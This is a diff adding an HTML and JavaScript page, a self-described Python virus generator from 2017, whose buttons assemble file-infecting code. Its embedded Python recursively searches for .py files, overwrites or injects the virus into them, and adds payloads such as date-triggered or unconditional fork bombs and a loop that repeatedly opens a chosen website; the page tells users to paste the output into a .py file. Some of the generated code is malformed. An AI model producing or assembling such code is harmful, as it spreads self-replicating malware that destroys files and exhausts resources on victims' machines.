@@ -1,0 +1,424 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    
+    <title>LVL 0.11</title>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
+    <link rel="stylesheet" href="https://unpkg.com/purecss@0.6.2/build/pure-min.css" integrity="sha384-UQiGfs9ICog+LwheBSRCt1o5cbyKIHbwjWscjemyBMT9YCUMZffs6UqUTd0hObXD" crossorigin="anonymous">
+    <link href="https://fonts.googleapis.com/css?family=Press+Start+2P|Share+Tech+Mono" rel="stylesheet">
+    <link rel="stylesheet" href="https://unpkg.com/purecss@0.6.2/build/pure-min.css" integrity="sha384-UQiGfs9ICog+LwheBSRCt1o5cbyKIHbwjWscjemyBMT9YCUMZffs6UqUTd0hObXD" crossorigin="anonymous">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/bootbox.js/4.4.0/bootbox.min.js"></script>
+</head>
+<body>
+
+	<div id="appear">
+	
+    	</br>
+        <h4>What will you name your little virus?</h4><hr>
+
+        </br><h5><input type="name" id="name" placeholder="Cryware"></h5>
+
+        <p></br><button onclick="justbecauseiwantto(); appear()" class="pure-button pure-button-primary">Continue</button></br></p>
+		
+		<p></br><button onclick="justbecauseiwantto(); appear(); noob();" class="pure-button pure-button-primary">Tutorial Mode</button></br></p>
+	
+	</div>
+
+	<div id="disappear">
+	<div id="menu0"><a href="https://www.patreon.com/jacoder23"> <img alt="Alpha 0.1 - Languages: Python - The point of this project is not to make a complex virus generator that doesn't work.</br>Instead, this version will be much simpler and will be far more reliable.</br>It won't have as many features at first but I'll keep adding more options to this program over time.</br>Have fun! Oh and be careful with who or what you try to use this on.</br>This right now only makes Python viruses.</br>So, it might be pretty useless to an office worker but might be terrible for a programmer or even killer for a Django website.  - Jacoder23" id="logo" width="384" height="128" src="http://i.imgur.com/J1FVhKT.gif"> </img> </a></div>
+    <div id="menu1">
+        <a id="search" onclick="search1act(); searchfade();"> <img id="search1" onmouseover="search1idle()" onmouseout="search1name()" width="256" height="256" src="http://i.imgur.com/z4jxyob.gif"> </img> </a>
+        <a id="infect" onclick="infect1act(); infectfade();"> <img id="infect1" onmouseover="infect1idle()" onmouseout="infect1name()" width="256" height="256" src="http://i.imgur.com/8amf45p.gif"> </img> </a>
+        <a id="py" onclick="py1act(); pyfade();"> <img id="py1" onmouseover="py1idle()" onmouseout="py1name()" width="256" height="256" src="http://i.imgur.com/nQyp0DZ.gif"> </img> </a>
+
+    </div>
+
+    <div id="menu2">
+
+        <h6 id="code"></h6>
+
+    </div>
+    
+    <div id="menu3">
+
+        </br><p id="bytes"><button onclick="generate()" class="pure-button">Generate Virus</button></p>
+
+    </div>
+	
+	<div id="menu4">
+
+        </br><p id="help">Need help? Just hover over any element and it's help text will appear here!</p>
+
+    </div>
+    </div>
+
+    <script>
+    
+    var virusname = "DVN";
+    
+    $("#appear").hide();
+    $("#disappear").hide();
+    
+    $("#appear").fadeIn(3000);
+    
+    function justbecauseiwantto(){
+    
+    	$("#menu4").hide();
+    
+    }
+    
+    function appear(){
+    
+    	virusname = document.getElementById("name").innerHTML;
+
+    	$("#appear").fadeOut(3000);
+    	$("#disappear").fadeIn(3000);
+
+    }
+    
+    var message = "error";
+    var res = "error";
+    var url = "error";
+    
+    var code = "";
+    var igiveupwiththesenames = "1";
+	
+	function noob(){
+	
+		$("#menu4").show();
+
+		setTimeout(function () {
+			$("#search").mouseover(function(){
+				document.getElementById("help").innerHTML = "Search is the part of the virus which scans for vulnerable files.";
+			});
+			
+			$("#infect").mouseover(function(){
+				document.getElementById("help").innerHTML = "Infect takes the files from Search and injects/overwrites it's own code onto it.";
+			});
+			
+			$("#py").mouseover(function(){
+				document.getElementById("help").innerHTML = "Pyload or Payload is miscellaneous code that's triggered after everything else is done.";
+			});
+			
+			$("#menu3").mouseover(function(){
+				document.getElementById("help").innerHTML = "You can click this button when you're finished designing your virus.";
+			});
+			
+			$("#menu4").mouseover(function(){
+				document.getElementById("help").innerHTML = "Need help? Just hover over any element and it's help text will appear here!";
+			});
+			
+			$("#menu0").mouseover(function(){
+				document.getElementById("help").innerHTML = "The logo, with a link to my patreon.";
+			});
+		}, 3000);
+	}
+    
+    function search1act(){
+
+        document.getElementById("menu2").innerHTML += "<div id=\"opt1\"></br></br><button onclick=\"searchfast()\" class=\"pure-button\">Fast</button><hr></div>";
+
+    }
+    
+    function infect1act(){
+
+        document.getElementById("menu2").innerHTML += "<div id=\"opt2\"></br></br><button onclick=\"infectoverwrite()\" class=\"pure-button\">Overwriting</button></br></br><button onclick=\"infectappend()\" class=\"pure-button\">Appending</button></br></br><button onclick=\"infectprepend()\" class=\"pure-button\">Prepending</button><hr></div>";
+
+    }
+
+    function search1name(){
+
+        document.getElementById("search1").src = "http://i.imgur.com/z4jxyob.gif";
+
+    }
+    
+    function search1idle(){
+
+        document.getElementById("search1").src = "http://i.imgur.com/LsLc96R.gif";
+
+    }
+    
+    function infect1name(){
+
+        document.getElementById("infect1").src = "http://i.imgur.com/8amf45p.gif";
+
+    }
+    
+    function infect1idle(){
+
+        document.getElementById("infect1").src = "http://i.imgur.com/UdMaiXo.gif";
+
+    }
+    
+    function py1act(){
+
+        document.getElementById("menu2").innerHTML += "<div id=\"opt3\"></br></br><button onclick=\"bombdaymsg()\" class=\"pure-button\">Birthday MSG</button></br></br><button onclick=\"bombday()\" class=\"pure-button\">Birthday BOMB</button></br></br><button onclick=\"bombbomb()\" class=\"pure-button\">Lag-BOMB</button></br></br><button onclick=\"webbomb()\" class=\"pure-button\">Web-BOMB</button><hr></div>";
+    }
+
+    function py1name(){
+
+        document.getElementById("py1").src = "http://i.imgur.com/nQyp0DZ.gif";
+
+    }
+    
+    function py1idle(){
+
+        document.getElementById("py1").src = "http://i.imgur.com/CNRdOxu.gif";
+
+    }
+    
+    function searchfast(){
+    
+    	opt1();
+    
+        code = "def&nbspsearch(path):</br>&nbsp&nbsp&nbsp&nbspfilestoinfect&nbsp=&nbsp[]</br>&nbsp&nbsp&nbsp&nbspfilelist&nbsp=&nbspos.listdir(path)</br>&nbsp&nbsp&nbsp&nbspfor&nbspfname&nbspin&nbspfilelist:</br>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbspif&nbspos.path.isdir(path+\"/\"+fname):</br>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbspfilestoinfect.extend(search(path+\"/\"+fname))</br>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbspelif&nbspfname[-3:]&nbsp==&nbsp\".py\":</br>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbspinfected&nbsp=&nbspFalse</br>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbspfor&nbspline&nbspin&nbspopen(path+\"/\"+fname):</br>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbspif&nbspSIGNATURE&nbspin&nbspline:</br>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbspinfected&nbsp=&nbspTrue</br>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbspbreak</br>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbspif&nbspinfected&nbsp==&nbspFalse:</br>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbspfilestoinfect.append(path+\"/\"+fname)</br>&nbsp&nbsp&nbsp&nbspreturn&nbspfilestoinfect" + code;
+    
+    }
+    
+    function infectoverwrite(){
+    
+    	opt2();
+    	
+    	igiveupwiththesenames = "2";
+    
+        code += "def&nbspinfect(filestoinfect):</br>&nbsp&nbsp&nbsp&nbspvirus&nbsp=&nbspopen(os.path.abspath(__file__))</br>&nbsp&nbsp&nbsp&nbspvirusstring&nbsp=&nbsp\"\"</br>&nbsp&nbsp&nbsp&nbspfor&nbspi,line&nbspin&nbspenumerate(virus):</br>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbspif&nbspi>=0&nbspand&nbspi&nbsp<39:</br>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbspvirusstring&nbsp+=&nbspline</br>&nbsp&nbsp&nbsp&nbspvirus.close</br>&nbsp&nbsp&nbsp&nbspfor&nbspfname&nbspin&nbspfilestoinfect:</br>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbspf&nbsp=&nbspopen(fname)</br>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsptemp&nbsp=&nbspf.read()</br>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbspf.close()</br>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbspf&nbsp=&nbspopen(fname,\"w\")</br>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbspf.write(virusstring)</br>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbspf.close()";
+    
+    }
+    
+    function infectappend(){
+    
+    	opt2();
+    	
+    	igiveupwiththesenames = "2";
+    
+        code += "def&nbspinfect(filestoinfect):</br>&nbsp&nbsp&nbsp&nbspvirus&nbsp=&nbspopen(os.path.abspath(__file__))</br>&nbsp&nbsp&nbsp&nbspvirusstring&nbsp=&nbsp\"\"</br>&nbsp&nbsp&nbsp&nbspfor&nbspi,line&nbspin&nbspenumerate(virus):</br>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbspif&nbspi>=0&nbspand&nbspi&nbsp<39:</br>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbspvirusstring&nbsp+=&nbspline</br>&nbsp&nbsp&nbsp&nbspvirus.close</br>&nbsp&nbsp&nbsp&nbspfor&nbspfname&nbspin&nbspfilestoinfect:</br>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbspf&nbsp=&nbspopen(fname)</br>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsptemp&nbsp=&nbspf.read()</br>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbspf.close()</br>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbspf&nbsp=&nbspopen(fname,\"w\")</br>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbspf.write(temp&nbsp+&nbspvirusstring)</br>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbspf.close()";
+    
+    }
+    
+    function infectprepend(){
+    
+    	opt2();
+    	
+    	igiveupwiththesenames = "2";
+    
+        code += "def&nbspinfect(filestoinfect):</br>&nbsp&nbsp&nbsp&nbspvirus&nbsp=&nbspopen(os.path.abspath(__file__))</br>&nbsp&nbsp&nbsp&nbspvirusstring&nbsp=&nbsp\"\"</br>&nbsp&nbsp&nbsp&nbspfor&nbspi,line&nbspin&nbspenumerate(virus):</br>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbspif&nbspi>=0&nbspand&nbspi&nbsp<39:</br>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbspvirusstring&nbsp+=&nbspline</br>&nbsp&nbsp&nbsp&nbspvirus.close</br>&nbsp&nbsp&nbsp&nbspfor&nbspfname&nbspin&nbspfilestoinfect:</br>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbspf&nbsp=&nbspopen(fname)</br>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsptemp&nbsp=&nbspf.read()</br>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbspf.close()</br>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbspf&nbsp=&nbspopen(fname,\"w\")</br>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbspf.write(virusstring&nbsp+&nbsptemp)</br>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbspf.close()";
+
+    }
+    
+    function bombday(){
+    
+    	var message = "error";
+    	var res = "error";
+        
+        if(igiveupwiththesenames === "1"){
+
+    		alert("Please select your infection type first.");
+    		
+    	} else if(igiveupwiththesenames === "2"){
+    	
+    		res = [prompt("What month will the bomb activate? (By a number)"), prompt("What day will the bomb activate? (By a number)")];
+    		
+    		code += "def&nbspbomb():</br>&nbsp&nbsp&nbsp&nbspif&nbspdatetime.datetime.now().month&nbsp==&nbsp" + res[0] + "&nbspand&nbspdatetime.datetime.now().day&nbsp==&nbsp" + res[1] + ":</br>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbspwhile(1):</br>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbspos.fork()</br>filestoinfect&nbsp=&nbspsearch(os.path.abspath(\"\"))</br>infect(filestoinfect)</br>bomb()</br>";
+
+    		opt3();
+
+    	}
+    }
+    
+    function bombdaymsg(){
+    
+    	var message = "error";
+    	var res = "error";
+    	
+    	if(igiveupwiththesenames === "1"){
+
+    		alert("Please select your infection type first.");
+    		
+    	} else if(igiveupwiththesenames === "2"){
+    	
+    		res = [prompt("What month will the message activate? (By a number)"), prompt("What day will the message activate? (By a number)")];
+    		message = prompt("What should the message be?");
+    		
+    		code += "def&nbspbomb():</br>&nbsp&nbsp&nbsp&nbspif&nbspdatetime.datetime.now().month&nbsp==&nbsp" + res[0] + "&nbspand&nbspdatetime.datetime.now().day&nbsp==&nbsp" + res[1] + ":</br>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbspprint&nbsp\"" + message + "\"</br>filestoinfect&nbsp=&nbspsearch(os.path.abspath(\"\"))</br>infect(filestoinfect)</br>bomb()";
+
+    		opt3();
+
+    	}
+    }
+    
+    function bombbomb(){
+    
+    	if(igiveupwiththesenames === "1"){
+
+    		alert("Please select your infection type first.");
+    		
+    	} else if(igiveupwiththesenames === "2"){
+    		
+    		code += "def&nbspbomb():</br>&nbsp&nbsp&nbsp&nbspwhile(1):</br>&nbsp&nbsp&nbsp&nbspos.fork()</br>filestoinfect&nbsp=&nbspsearch(os.path.abspath(\"\"))</br>infect(filestoinfect)</br>bomb()";
+
+    		opt3();
+
+    	}
+    }
+    
+    function webbomb(){
+    
+    	if(igiveupwiththesenames === "1"){
+
+    		alert("Please select your infection type first.");
+    		
+    	} else if(igiveupwiththesenames === "2"){
+    	
+    		url = prompt("What's the website's URL?");
+    		
+    		code += "</br>import&nbspweb&nbspbrowsercount&nbsp=&nbsp0</br>while&nbsp(count):</br>&nbsp&nbsp&nbsp&nbspwebbrowser.open(\"" + url + "\")"
+
+    		opt3();
+
+    	}
+    }
+    
+    
+    function generate(){
+    
+    	document.write(code + "</br># " +  virusname + " - http://jacoder23.neocities.org/lvlup.html - 2017</br><hr></br>To use this code please copy and paste it into a .py file. This is a Python virus. - Jacoder23, 2017");
+    
+    }
+    
+    function searchfade(){
+
+		$("#search").fadeOut(1500);
+
+    }
+    
+    function infectfade(){
+
+		$("#infect").fadeOut(1500);
+
+    }
+    
+    function pyfade(){
+
+		$("#py").fadeOut(1500);
+
+    }
+    
+    function opt1(){
+
+    	$("#opt1").fadeOut(1000);
+
+    }
+    
+    function opt2(){
+
+    	$("#opt2").fadeOut(1000);
+
+    }
+    
+    function opt3(){
+
+    	$("#opt3").fadeOut(1000);
+
+    }
+
+    </script>
+
+    <style>
+        body {
+            background-color:#000;
+            font-family: 'Press Start 2P', cursive;
+            text-align: center;
+            padding-top:10em;
+        }
+
+        * { color:#00FF00; text-decoration: none;}
+
+        img {
+            image-rendering: optimizeSpeed;             /* STOP SMOOTHING, GIVE ME SPEED  */
+            image-rendering: -moz-crisp-edges;          /* Firefox                        */
+            image-rendering: -o-crisp-edges;            /* Opera                          */
+            image-rendering: -webkit-optimize-contrast; /* Chrome (and eventually Safari) */
+            image-rendering: pixelated; /* Chrome */
+            image-rendering: optimize-contrast;         /* CSS3 Proposed                  */
+            -ms-interpolation-mode: nearest-neighbor;   /* IE8+                           */
+        }
+        
+        #appear {
+            color: #00ff00;
+            background: rgb(0, 0, 0);
+            border-radius: 3px;
+            border-width: 3px;
+            border-style: dashed;
+            border-color: #00ff00;
+            text-shadow: 0 1px 1px rgba(0, 0, 0, 0.2);
+        }
+		
+		#menu0 {
+            position:absolute; 
+            left: 80px; 
+            top: 40px;
+        }
+        
+        #menu1 {
+            position:absolute; 
+            left: 80px; 
+            bottom: 40px;
+        }
+        
+        #menu2 {
+            position:absolute;
+            right: 160px; 
+            top: 40px; 
+            font-family: 'Press Start 2P', cursive;
+        }
+
+        #menu3 {
+            position:absolute; 
+            right: 20px; 
+            bottom: 20px; 
+            font-family: 'Press Start 2P', cursive;
+        }
+
+		#menu4 {
+            position:absolute; 
+            right: 20px; 
+            top: 20px;
+			font-size: 10px;
+            font-family: 'Press Start 2P', cursive;
+        }
+        
+        #name{
+        	background-color: black;
+        	border-color: black;
+        	border-style: dashed;
+            border-color: #00ff00;
+            border-width: 3px;
+            font-size: 40px;
+        }
+
+        .pure-button {
+            color: #00ff00;
+            background: rgb(0, 0, 0);
+            border-radius: 4px;
+            border-width: 4px;
+            border-style: dashed;
+            border-color: #00ff00;
+            text-shadow: 0 1px 1px rgba(0, 0, 0, 0.2);
+        }
+
+		.disabled {
+			pointer-events: none;
+			cursor: default;
+		}
+		
+		hr {
+			border-top: 3px dashed;
+			color: #00ff00;
+		}
+
+    </style>
+    
+</body>
+</html>
